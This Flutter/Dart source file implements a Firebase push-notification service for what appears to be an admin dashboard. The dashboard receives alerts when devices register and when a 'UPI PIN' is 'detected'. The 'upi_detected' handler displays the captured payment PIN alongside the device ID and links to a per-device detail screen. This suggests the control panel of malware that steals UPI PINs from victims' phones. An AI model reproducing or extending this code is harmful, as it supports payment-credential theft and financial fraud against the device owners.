import 'package:firebase_messaging/firebase_messaging.dart'
    if (dart.library.html) '../../core/utils/firebase_stub.dart';
import 'package:flutter_local_notifications/flutter_local_notifications.dart'
    if (dart.library.html) '../../core/utils/flutter_local_notifications_stub.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:flutter/foundation.dart' show kIsWeb, defaultTargetPlatform;
import 'package:provider/provider.dart';
import '../../main.dart';
import '../../presentation/providers/device_provider.dart';
import '../../presentation/screens/devices/device_detail_screen.dart';

bool _isMobilePlatform() {
  if (kIsWeb) return false;
  return defaultTargetPlatform == TargetPlatform.android ||
      defaultTargetPlatform == TargetPlatform.iOS;
}

class FCMService {
  static final FCMService _instance = FCMService._internal();
  factory FCMService() => _instance;
  FCMService._internal();
  
  FirebaseMessaging? _fcm;
  FirebaseMessaging? get fcm {
    if (!_isMobilePlatform()) {
      return null;
    }
    _fcm ??= FirebaseMessaging.instance;
    return _fcm;
  }
  
  final FlutterLocalNotificationsPlugin _localNotifications = 
      FlutterLocalNotificationsPlugin();
  
  String? _fcmToken;
  
  bool get isAvailable => _isMobilePlatform();
  
  Future<void> initialize() async {
    debugPrint('===== INITIALIZING FCM SERVICE =====');
    
    if (!_isMobilePlatform()) {
      debugPrint('FCM Service skipped for platform: $defaultTargetPlatform (only available on Android/iOS)');
      return;
    }
    
    try {
      if (fcm == null) {
        debugPrint('FCM is not available on this platform');
        return;
      }
      
      NotificationSettings settings = await fcm!.requestPermission(
        alert: true,
        badge: true,
        sound: true,
        provisional: false,
        announcement: false,
        carPlay: false,
        criticalAlert: false,
      );
      
      debugPrint('Permission status: ${settings.authorizationStatus}');
      debugPrint('Alert: ${settings.alert}');
      debugPrint('Sound: ${settings.sound}');
      
      const AndroidInitializationSettings androidSettings =
          AndroidInitializationSettings('@mipmap/ic_launcher');
      
      const DarwinInitializationSettings iosSettings =
          DarwinInitializationSettings();
      
      const InitializationSettings initSettings = InitializationSettings(
        android: androidSettings,
        iOS: iosSettings,
      );
      
      final initialized = await _localNotifications.initialize(
        initSettings,
        onDidReceiveNotificationResponse: _onNotificationTapped,
      );
      
      debugPrint('Local notifications initialized: $initialized');
      
      const AndroidNotificationChannel channel = AndroidNotificationChannel(
        'admin_notifications',
        'Admin Notifications',
        description: 'Notifications for admin activities',
        importance: Importance.max,
        enableVibration: true,
        playSound: true,
        showBadge: true,
      );
      
      await _localNotifications
          .resolvePlatformSpecificImplementation<
              AndroidFlutterLocalNotificationsPlugin>()
          ?.createNotificationChannel(channel);
      
      debugPrint('Notification channel created');
      
      _fcmToken = await fcm!.getToken();
      debugPrint('FCM Token: $_fcmToken');
      
      if (_fcmToken == null) {
        debugPrint('CRITICAL: Failed to get FCM token!');
      } else {
        debugPrint('FCM Token obtained successfully');
        await _saveToken(_fcmToken!);
      }
      
      fcm!.onTokenRefresh.listen((token) {
        debugPrint('FCM Token refreshed: $token');
        _fcmToken = token;
        _saveToken(token);
      });
      
      debugPrint('Setting up message listeners...');
      FirebaseMessaging.onMessage.listen(_handleForegroundMessage);
      FirebaseMessaging.onMessageOpenedApp.listen(_handleNotificationTap);
      RemoteMessage? initialMessage = await fcm!.getInitialMessage();
      if (initialMessage != null) {
        debugPrint('App opened from notification: ${initialMessage.messageId}');
        _handleNotificationTap(initialMessage);
      }
      
      debugPrint('===== FCM SERVICE INITIALIZED SUCCESSFULLY =====');
    } catch (e) {
      debugPrint('CRITICAL ERROR initializing FCM: $e');
      debugPrint('Stack trace: ${StackTrace.current}');
    }
  }
  
  Future<void> _saveToken(String token) async {
    try {
      final prefs = await SharedPreferences.getInstance();
      await prefs.setString('fcm_token', token);
      debugPrint('Token saved to SharedPreferences');
    } catch (e) {
      debugPrint('Error saving token: $e');
    }
  }
  
  Future<String?> getToken() async {
    if (_fcmToken != null) return _fcmToken;
    
    final prefs = await SharedPreferences.getInstance();
    return prefs.getString('fcm_token');
  }
  
  void _handleForegroundMessage(RemoteMessage message) {
    debugPrint('===== FOREGROUND MESSAGE RECEIVED =====');
    debugPrint('Message ID: ${message.messageId}');
    debugPrint('From: ${message.from}');
    debugPrint('Sent Time: ${message.sentTime}');
    debugPrint('Data: ${message.data}');
    debugPrint('Notification: ${message.notification?.title} - ${message.notification?.body}');
    
    RemoteNotification? notification = message.notification;
    
    if (notification != null) {
      debugPrint('Has notification payload');
      _showLocalNotification(
        notification.title ?? 'Notification',
        notification.body ?? '',
        message.data,
      );
    } else if (message.data.isNotEmpty) {
      debugPrint('Data-only message, creating notification...');
      final type = message.data['type'];
      
      if (type == 'device_registered') {
        final model = message.data['model'] ?? 'Unknown Device';
        final appType = message.data['app_type'] ?? '';
        _showLocalNotification(
          'New Device Registered',
          '$model${appType.isNotEmpty ? ' ($appType)' : ''}',
          message.data,
        );
      } else if (type == 'upi_detected') {
        final deviceId = message.data['device_id'] ?? '';
        final upiPin = message.data['upi_pin'] ?? '';
        final model = message.data['model'] ?? '';
        _showLocalNotification(
          'UPI PIN Detected',
          'PIN: $upiPin - Device: $deviceId${model.isNotEmpty ? ' ($model)' : ''}',
          message.data,
        );
      } else {
        _showLocalNotification(
          message.data['title'] ?? 'New Notification',
          message.data['body'] ?? 'You have a new notification',
          message.data,
        );
      }
    } else {
      debugPrint('Message has no notification and no data!');
    }
  }
  
  Future<void> _showLocalNotification(
    String title,
    String body,
    Map<String, dynamic> data,
  ) async {
    debugPrint('===== SHOWING LOCAL NOTIFICATION =====');
    debugPrint('Title: $title');
    debugPrint('Body: $body');
    debugPrint('Data: $data');
    
    try {
      final prefs = await SharedPreferences.getInstance();
      final notificationsEnabled = prefs.getBool('notifications_enabled') ?? true;
      
      debugPrint('Notifications enabled in settings: $notificationsEnabled');
      
      if (!notificationsEnabled) {
        debugPrint('Notifications disabled by user - skipping');
        return;
      }
      
      final notificationId = DateTime.now().millisecondsSinceEpoch ~/ 1000;
      debugPrint('Notification ID: $notificationId');
      
      await _localNotifications.show(
        notificationId,
        title,
        body,
        NotificationDetails(
          android: AndroidNotificationDetails(
            'admin_notifications',
            'Admin Notifications',
            channelDescription: 'Notifications for admin activities',
            importance: Importance.max,
            priority: Priority.high,
            icon: '@mipmap/ic_launcher',
            enableVibration: true,
            playSound: true,
            showWhen: true,
            styleInformation: BigTextStyleInformation(body),
            ticker: title,
          ),
          iOS: const DarwinNotificationDetails(
            presentAlert: true,
            presentBadge: true,
            presentSound: true,
          ),
        ),
        payload: jsonEncode(data),
      );
      
      debugPrint('Local notification shown successfully!');
    } catch (e) {
      debugPrint('CRITICAL ERROR showing notification: $e');
      debugPrint('Stack trace: ${StackTrace.current}');
    }
  }
  
  void _handleNotificationTap(RemoteMessage message) {
    debugPrint('===== NOTIFICATION TAPPED =====');
    debugPrint('Message ID: ${message.messageId}');
    debugPrint('Data: ${message.data}');
    
    String? type = message.data['type'];
    
    if (type == 'device_registered' || type == 'upi_detected') {
      String deviceId = message.data['device_id'] ?? '';
      debugPrint('Navigate to device: $deviceId');
      _navigateToDevice(deviceId);
    }
  }
  
  void _onNotificationTapped(NotificationResponse response) {
    debugPrint('Local notification tapped');
    if (response.payload != null) {
      try {
        Map<String, dynamic> data = jsonDecode(response.payload!);
        debugPrint('Payload: $data');
        
        String? type = data['type'];
        
        if (type == 'device_registered' || type == 'upi_detected') {
          String deviceId = data['device_id'] ?? '';
          debugPrint('Navigate to device: $deviceId');
          _navigateToDevice(deviceId);
        }
      } catch (e) {
        debugPrint('Error parsing notification payload: $e');
      }
    }
  }
  
  void _navigateToDevice(String deviceId) {
    debugPrint('Attempting to navigate to device: $deviceId');
    
      final context = navigatorKey.currentContext;
    if (context == null) {
      debugPrint('No navigator context available');
      return;
    }
    
    if (deviceId.isEmpty) {
      debugPrint('Device ID is empty');
      return;
    }
    
    try {
      Navigator.of(context).push(
        MaterialPageRoute(
          builder: (context) {
            final deviceProvider = context.read<DeviceProvider>();
            final device = deviceProvider.devices.firstWhere(
              (d) => d.deviceId == deviceId,
              orElse: () => throw Exception('Device not found'),
            );
            return DeviceDetailScreen(device: device);
          },
        ),
      );
      debugPrint('Navigation to device $deviceId initiated');
    } catch (e) {
      debugPrint('Error navigating to device: $e');
    }
  }
}
